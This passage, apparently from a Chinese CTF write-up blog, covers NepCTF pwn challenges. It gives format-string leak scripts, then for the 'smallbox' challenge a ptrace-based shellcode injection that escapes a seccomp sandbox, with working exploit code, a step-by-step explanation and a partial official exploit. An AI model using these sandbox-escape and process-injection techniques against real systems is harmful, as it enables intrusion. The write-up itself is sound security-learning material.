<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io=remote(<span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;nepctf32-1ris-vabv-sri2-p9kvlhq2i224.nepctf.com&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">name=<span class="string">f&quot;%<span class="subst">&#123;<span class="number">12</span>+<span class="number">9</span>&#125;</span>$p&quot;</span>.encode()</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    name+=<span class="string">f&quot;-%<span class="subst">&#123;<span class="number">13</span>+<span class="number">9</span>+i&#125;</span>$p&quot;</span>.encode()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;please input your name:\n&quot;</span>,name)</span><br><span class="line">file=<span class="string">b&quot;time&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>,file)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;input file name you want to read:\n&quot;</span>,<span class="string">b&quot;flag&quot;</span>)</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>官方exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./time&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name:\n&#x27;</span>,</span><br><span class="line"><span class="string">b&#x27;%28$p.%27$p.%26$p.%25$p.%24$p.%23$p.%22$p.%21$p.%20$p&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1000000</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;./flag&#x27;</span>)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>





<h2 id="smallbox"><a href="#smallbox" class="headerlink" title="smallbox"></a>smallbox</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] please input your shellcode: &quot;</span>);</span><br><span class="line">    v4 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL);</span><br><span class="line">    install_seccomp();</span><br><span class="line">    MEMORY[<span class="number">0xDEADC0DE000</span>]();  <span class="comment">//执行shellcode</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里我们可以看到父线程开启了sandbox的保护，子进程没有但是子进程是个无限循环。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mmap((<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>) == (<span class="type">void</span> *)<span class="number">0xDEADC0DE000L</span>L </span><br></pre></td></tr></table></figure>

<p>在0xDEADC0DE000上创建了RWX(可读,可写，可执行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ echo -ne &quot;expected_input&quot; | seccomp-tools dump ./smallbox</span><br><span class="line">[+] please input your shellcode: </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只能用ptrace</p>
<p>所以攻击思路就是在子进程里用ORW，在到父进程执行，具体怎么绕过无限循环能先看exp(大佬原创的，我纯黏贴)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;nepctf32-infg-wkc9-bblj-arh6h95nc659.nepctf.com&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io,<span class="string">&quot;b read&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;[+] please input your shellcode: &quot;</span>)</span><br><span class="line">shellcode =asm(<span class="string">&quot;mov r14d, DWORD PTR [rbp-0xc]&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;已获得子进程pid&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;orw</span></span><br><span class="line"><span class="string">0xdeadc0de000:  0x010101010101b848  0x672e2fb848500101</span></span><br><span class="line"><span class="string">0xdeadc0de010:  0x043148010166606d  0xf631d231e7894824</span></span><br><span class="line"><span class="string">0xdeadc0de020:  0x01ba41050f58026a  0x0301f28141010102</span></span><br><span class="line"><span class="string">0xdeadc0de030:  0x6ad2315f016a0101  0x00050f58286a5e03</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">16</span>,<span class="string">&quot;r14&quot;</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rcx,0x500000000</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    sub rcx,1</span></span><br><span class="line"><span class="string">    test rcx,rcx</span></span><br><span class="line"><span class="string">    jnz loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;进程附加成功&quot;</span>)</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">12</span>,<span class="string">&quot;r14&quot;</span>,<span class="number">0</span>,<span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&quot;mov rsp,0xDEADC0DE588;mov rax, 0xDEADC0DE000;push rax;mov rsp,0xDEADC0DE800&quot;</span>)</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>,<span class="number">0x010101010101b848</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">8</span>,<span class="number">0x672e2fb848500101</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x10</span>,<span class="number">0x043148010166606d</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x18</span>,<span class="number">0xf631d231e7894824</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x20</span>,<span class="number">0x01ba41050f58026a</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x28</span>,<span class="number">0x0301f28141010102</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x30</span>,<span class="number">0x6ad2315f016a0101</span>))</span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x38</span>,<span class="number">0x00050f58286a5e03</span>))</span><br><span class="line"><span class="comment">#================================================================================================================</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">13</span>,<span class="string">&quot;r14&quot;</span>,<span class="number">0</span>,<span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br><span class="line"><span class="comment">#================================================================================================================</span></span><br><span class="line">shellcode+=asm(shellcraft.ptrace(<span class="number">17</span>,<span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">shellcode+=asm(<span class="string">&quot;jmp $&quot;</span>)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ptrace请求类型详解</p>
<ol>
<li><code>PTRACE_ATTACH</code> (16)</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">16</span>, <span class="string">&quot;r14&quot;</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：将当前进程附加到目标进程作为调试器</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID（子进程）</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>使子进程进入暂停状态（相当于发送SIGSTOP）</li>
<li>父进程成为子进程的调试器，可以完全控制子进程</li>
</ul>
</li>
<li><strong>系统调用号</strong>：<code>__NR_ptrace = 101</code>，请求类型为16</li>
</ul>
<ol start="2">
<li><code>PTRACE_GETREGS</code> (12)</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">12</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：获取目标进程的寄存器状态</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0</code>：忽略参数</li>
<li><code>0xDEADC0DE500</code>：寄存器数据存储位置</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>将子进程的所有寄存器值复制到<code>0xDEADC0DE500</code>位置</li>
<li>结构体大小为<code>sizeof(user_regs_struct) = 216字节</code></li>
</ul>
</li>
<li><strong>目的</strong>：为后续修改寄存器做准备</li>
</ul>
<ol start="3">
<li><code>PTRACE_POKETEXT</code> (5)</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">5</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0xDEADC0DE000</span>, <span class="number">0x010101010101b848</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：向目标进程内存写入数据</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0xDEADC0DE000</code>：写入地址</li>
<li><code>0x010101010101b848</code>：写入的8字节数据</li>
</ul>
</li>
<li><strong>关键特性</strong>：<ul>
<li>每次调用只能写入<strong>8字节</strong>数据</li>
<li>需要多次调用写入完整shellcode</li>
</ul>
</li>
</ul>
<p>4.<code>PTRACE_SETREGS</code> (13)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(<span class="number">13</span>, <span class="string">&quot;r14&quot;</span>, <span class="number">0</span>, <span class="number">0xDEADC0DE000</span>+<span class="number">0x500</span>))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：设置目标进程的寄存器状态</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0</code>：忽略参数</li>
<li><code>0xDEADC0DE500</code>：寄存器数据来源位置</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>将<code>0xDEADC0DE500</code>处的寄存器数据恢复到子进程</li>
<li>关键点：虽然恢复了寄存器，但此时子进程的代码已被覆盖</li>
</ul>
</li>
</ul>
<ol start="5">
<li><code>PTRACE_DETACH</code> (17)</li>
</ol>
<p>python</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.ptrace(17, &quot;r14&quot;, 0, 0))</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong>：分离调试器与目标进程</li>
<li><strong>参数</strong>：<ul>
<li><code>r14</code>：目标进程PID</li>
<li><code>0</code>：忽略参数</li>
<li><code>0</code>：发送给子进程的信号（0表示无信号）</li>
</ul>
</li>
<li><strong>效果</strong>：<ul>
<li>子进程恢复执行</li>
<li>父进程不再控制子进程</li>
</ul>
</li>
</ul>
<p>阶段1: 附加和控制子进程</p>
<ol>
<li><p><strong>PTRACE_ATTACH(16)</strong></p>
<ul>
<li>父进程附加到子进程</li>
<li>子进程暂停执行</li>
</ul>
</li>
<li><p><strong>延时循环</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rcx,0x500000000</span><br><span class="line">loop:</span><br><span class="line">  sub rcx,1</span><br><span class="line">  jnz loop</span><br></pre></td></tr></table></figure>

<ul>
<li>目的：确保附加操作完成（替代waitpid）</li>
<li>原理：给内核时间处理附加请求</li>
</ul>
</li>
</ol>
<p>阶段2: 准备内存操作</p>
<ol>
<li><p><strong>PTRACE_GETREGS(12)</strong></p>
<ul>
<li>保存子进程当前寄存器状态</li>
<li>存储到共享内存的0x500偏移处</li>
</ul>
</li>
<li><p><strong>调整父进程栈指针</strong></p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,0xDEADC0DE588</span><br><span class="line">mov rax, 0xDEADC0DE000</span><br><span class="line">push rax</span><br><span class="line">mov rsp,0xDEADC0DE800</span><br></pre></td></tr></table></figure>

<ul>
<li>目的：避免后续操作破坏父进程栈</li>
<li>将栈移到共享内存的安全区域</li>
</ul>
</li>
</ol>
<p>阶段3: 注入恶意代码</p>
<ol>
<li><p><strong>8次PTRACE_POKETEXT(5)调用</strong></p>
<ul>
<li><p>向子进程内存写入64字节ORW shellcode</p>
</li>
<li><p>覆盖子进程原来的循环代码：</p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; 原始代码 (被覆盖)</span><br><span class="line">while(1): </span><br><span class="line">   jmp $   ; 机器码: EB FE</span><br><span class="line"></span><br><span class="line">; 覆盖后代码</span><br><span class="line">movabs rax,0x101010101010101  ; 新指令</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p>阶段4: 恢复执行</p>
<ol>
<li><strong>PTRACE_SETREGS(13)</strong><ul>
<li>“恢复”子进程寄存器</li>
<li>实际效果：RIP仍指向被覆盖的代码区域</li>
</ul>
</li>
<li><strong>PTRACE_DETACH(17)</strong><ul>
<li>分离父进程和子进程</li>
<li>子进程从当前RIP开始执行（即ORW shellcode）</li>
</ul>
</li>
</ol>
<p>阶段5: 维持进程</p>
<ol>
<li><p><strong>父进程挂起</strong></p>
<p>asm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp $   ; 无限循环</span><br></pre></td></tr></table></figure>

<ul>
<li>防止父进程退出导致程序终止</li>
<li>保持子进程继续运行</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0xDEADC0DE000:</span><br><span class="line">  ; 设置文件路径 &quot;flag&quot;</span><br><span class="line">  mov rax, 0x67616c662f2e   ; &quot;./flag&quot;</span><br><span class="line">  push rax</span><br><span class="line">  </span><br><span class="line">  ; 系统调用序列</span><br><span class="line">  mov rdi, rsp      ; 文件路径指针</span><br><span class="line">  xor esi, esi      ; O_RDONLY (0)</span><br><span class="line">  xor eax, eax      ; 清空RAX</span><br><span class="line">  mov al, 2         ; syscall号: open=2</span><br><span class="line">  syscall           ; 调用open(&quot;flag&quot;)</span><br><span class="line">  </span><br><span class="line">  ; 读取文件内容</span><br><span class="line">  mov rdi, rax      ; 文件描述符</span><br><span class="line">  mov rsi, rsp      ; 缓冲区地址</span><br><span class="line">  mov rdx, 0x100    ; 读取长度</span><br><span class="line">  xor eax, eax      ; syscall号: read=0</span><br><span class="line">  syscall           ; 调用read()</span><br><span class="line">  </span><br><span class="line">  ; 输出到标准输出</span><br><span class="line">  mov rdi, 1        ; 文件描述符: stdout=1</span><br><span class="line">  mov rsi, rsp      ; 缓冲区地址</span><br><span class="line">  mov rdx, rax      ; 实际读取长度</span><br><span class="line">  mov al, 1         ; syscall号: write=1</span><br><span class="line">  syscall           ; 调用write()</span><br><span class="line">  </span><br><span class="line">  ; 退出</span><br><span class="line">  mov al, 60        ; syscall号: exit=60</span><br><span class="line">  syscall</span><br></pre></td></tr></table></figure>

<p>我就了解到这里了，还是太菜，多学吧wuuu~~~</p>
<p>官方exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./smallbox&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">PTRACE_GETREGS = <span class="number">12</span></span><br><span class="line">PTRACE_SETREGS = <span class="number">13</span></span><br><span class="line">PTRACE_ATTACH = <span class="number">16</span></span><br><span class="line">PTRACE_DETACH = <span class="number">17</span></span><br><span class="line">PTRACE_POKETEXT = <span class="number">4</span></span><br><span class="line">PTRACE_POKEDATA = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">injected_shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>,<span class="number">0</span>)+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x30</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">injected_shellcode=asm(injected_shellcode)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    /* ptrace(request=0x10, vararg_0=pid, vararg_1=0, vararg_2=0) */</span></span><br><span class="line"><span class="string">    xor r10d, r10d /* 0 */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_ATTACH&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x14]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    /* ptrace(request=0xc, vararg_0=pid vararg_1=0x0, vararg_2=shellcode+0x800) */</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push r10</span></span><br><span class="line"><span class="string">    add r10,0x800</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_GETREGS&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x14]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    add rdx,0x880</span></span><br><span class="line"><span class="string">    mov rdx,[rdx]</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rbx,0</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">    /* ptrace(request=0xc, vararg_0=pid vararg_1=rip+i, vararg_2=[shellcode+i+0x200]) */</span></span><br><span class="line"><span class="string">    push <span class="subst">&#123;PTRACE_POKETEXT&#125;</span></span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    pop r10</span></span><br><span class="line"><span class="string">    push r10</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    add rdx,rbx</span></span><br><span class="line"><span class="string">    mov r10,[r10+rbx+0x200]</span></span><br><span class="line"><span class="string">    mov esi, [rsp+0x1C]</span></span><br><span class="line"><span class="string">    /* call ptrace() */</span></span><br><span class="line"><span class="string">    push SYS_ptrace /* 0x65 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">   